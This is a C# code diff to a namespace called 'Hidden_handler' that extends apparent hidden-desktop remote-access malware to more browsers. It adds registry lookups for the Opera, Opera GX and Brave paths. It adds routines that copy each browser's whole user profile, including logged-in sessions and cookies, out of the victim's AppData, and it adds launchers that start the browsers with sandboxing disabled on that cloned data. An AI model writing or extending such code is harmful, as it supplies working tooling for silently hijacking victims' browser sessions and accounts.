@@ -90,6 +90,77 @@ namespace Hidden_handler
             return CreateProc(@"C:\Windows\explorer.exe");
         }
 
+        public string GetOperaPath()
+        {
+            const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
+            using (var clientsKey = Registry.CurrentUser.OpenSubKey(basePath))
+            {
+                if (clientsKey != null)
+                {
+                    foreach (var subKeyName in clientsKey.GetSubKeyNames())
+                    {
+                        if (subKeyName.Contains("Opera") && !subKeyName.Contains("GX"))
+                        {
+                            using (var operaKey = clientsKey.OpenSubKey($"{subKeyName}\\shell\\open\\command"))
+                            {
+                                if (operaKey != null)
+                                {
+                                    object operaPathObj = operaKey.GetValue("");
+                                    if (operaPathObj != null)
+                                    {
+                                        return operaPathObj.ToString().Trim('"');
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return null;
+        }
+
+        public string GetBravePath()
+        {
+            var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
+            if (path != null)
+            {
+                var split = path.Split('\"');
+                path = split.Length >= 2 ? split[1] : null;
+            }
+            return path;
+        }
+
+
+        public string GetOperaGXPath()
+        {
+            const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
+            using (var clientsKey = Registry.CurrentUser.OpenSubKey(basePath))
+            {
+                if (clientsKey != null)
+                {
+                    foreach (var subKeyName in clientsKey.GetSubKeyNames())
+                    {
+                        if (subKeyName.Contains("Opera") && subKeyName.Contains("GX"))
+                        {
+                            using (var operaGXKey = clientsKey.OpenSubKey($"{subKeyName}\\shell\\open\\command"))
+                            {
+                                if (operaGXKey != null)
+                                {
+                                    object operaGXPathObj = operaGXKey.GetValue("");
+                                    if (operaGXPathObj != null)
+                                    {
+                                        return operaGXPathObj.ToString().Trim('"');
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return null;
+        }
+
+
         public string getChromePath()
         {
 
@@ -164,6 +235,39 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir="+dataDir);
         }
 
+        public bool StartOpera()
+        {
+            string dataDir = @"C:\OperaAutomationData";
+            string path = GetOperaPath();
+            if (path == null || !File.Exists(path))
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
+        }
+
+        public bool StartOperaGX()
+        {
+            string dataDir = @"C:\OperaGXAutomationData";
+            string path = GetOperaGXPath();
+            if (path == null || !File.Exists(path))
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
+        }
+
+        public bool StartBrave()
+        {
+            string dataDir = @"C:\BraveAutomationData";
+            string path = GetBravePath();
+            if (path == null || !File.Exists(path))
+            {
+                return false;
+            }
+            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
+        }
+
         public bool StartEdge()
         {
             string dataDir = @"C:\EdgeAutomationData";
@@ -207,6 +311,75 @@ namespace Hidden_handler
             }
             catch { }
             return false;
+        }
+
+        public async Task<bool> CloneOperaGX()
+        {
+            try
+            {
+                string dataDir = @"C:\OperaGXAutomationData";
+                string source = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera GX Stable";
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
+                await CopyDirAsync(source, dataDir);
+                return true;
+
+            }
+            catch { }
+            return false;
+        }
+
+        public async Task<bool> CloneOpera()
+        {
+            try
+            {
+                string dataDir = @"C:\OperaAutomationData";
+                string source = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera Stable";
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
+                await CopyDirAsync(source, dataDir);
+                return true;
+
+            }
+            catch { }
+            return false;
+        }
+
+        public async Task<bool> CloneBrave()
+        {
+            try
+            {
+                string dataDir = @"C:\BraveAutomationData";
+                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\BraveSoftware\Brave-Browser\User Data";
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
+                await CopyDirAsync(source, dataDir);
+                return true;
+
+            }
+            catch { }
+            return false; 
         }
 
         public async Task<bool> CloneFirefox()
